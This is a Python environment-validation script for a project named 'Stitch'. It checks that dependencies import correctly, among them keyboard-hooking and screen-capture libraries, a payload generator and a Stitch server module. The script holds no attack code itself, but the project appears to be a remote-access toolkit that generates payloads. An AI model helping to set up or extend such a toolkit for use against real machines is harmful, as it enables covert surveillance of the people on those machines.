#!/usr/bin/env python3
"""
Environment Validation Script
Ensures all required dependencies and imports are available
"""

import sys
import os
import importlib

def check_import(module_name, package_name=None):
    """Check if a module can be imported"""
    try:
        if package_name:
            importlib.import_module(module_name, package_name)
        else:
            importlib.import_module(module_name)
        return True, None
    except ImportError as e:
        return False, str(e)

def validate_stitch_environment():
    """Validate the Stitch environment"""
    print("🔍 Validating Stitch Environment...")
    
    # Core Python modules
    core_modules = [
        'os', 'sys', 'time', 'threading', 'socket', 'json', 'hashlib',
        'subprocess', 'pathlib', 'datetime', 'configparser'
    ]
    
    # Third-party modules
    third_party_modules = [
        'flask', 'flask_socketio', 'requests', 'psutil', 'colorama',
        'mss', 'pexpect', 'pyxhook', 'Xlib', 'ptyprocess',
        'six', 'cryptography', 'Crypto', 'gevent', 'geventwebsocket',
        'flask_limiter', 'dotenv', 'flask_wtf', 'wtforms', 'email_validator'
    ]
    
    # Stitch-specific modules
    stitch_modules = [
        'Application.stitch_cmd',
        'Application.stitch_gen', 
        'Application.stitch_lib',
        'Application.stitch_utils',
        'Application.stitch_pyld_config',
        'Application.Stitch_Vars.globals',
        'unified_payload_generator'
    ]
    
    all_good = True
    
    print("\n📦 Checking Core Python Modules...")
    for module in core_modules:
        success, error = check_import(module)
        if success:
            print(f"  ✅ {module}")
        else:
            print(f"  ❌ {module}: {error}")
            all_good = False
    
    print("\n📦 Checking Third-Party Modules...")
    for module in third_party_modules:
        success, error = check_import(module)
        if success:
            print(f"  ✅ {module}")
        else:
            print(f"  ❌ {module}: {error}")
            all_good = False
    
    print("\n📦 Checking Stitch Modules...")
    for module in stitch_modules:
        success, error = check_import(module)
        if success:
            print(f"  ✅ {module}")
        else:
            print(f"  ❌ {module}: {error}")
            all_good = False
    
    return all_good

def test_critical_functions():
    """Test critical Stitch functions"""
    print("\n🧪 Testing Critical Functions...")
    
    try:
        # Test payload generation
        from unified_payload_generator import generate_payload
        print("  ✅ Unified payload generator imported")
        
        # Test Stitch server
        from Application.stitch_cmd import stitch_server
        print("  ✅ Stitch server imported")
        
        # Test web app
        from web_app import create_app
        print("  ✅ Web app imported")
        
        return True
        
    except Exception as e:
        print(f"  ❌ Critical function test failed: {e}")
        return False

def main():
    """Main validation function"""
    print("=" * 60)
    print("🔐 STITCH ENVIRONMENT VALIDATION")
    print("=" * 60)
    
    # Add workspace to path
    sys.path.insert(0, '/workspace')
    
    # Validate environment
    env_ok = validate_stitch_environment()
    
    # Test critical functions
    functions_ok = test_critical_functions()
    
    # Summary
    print("\n" + "=" * 60)
    if env_ok and functions_ok:
        print("🎉 ALL VALIDATIONS PASSED - ENVIRONMENT IS READY!")
        return True
    else:
        print("❌ SOME VALIDATIONS FAILED - CHECK ABOVE")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)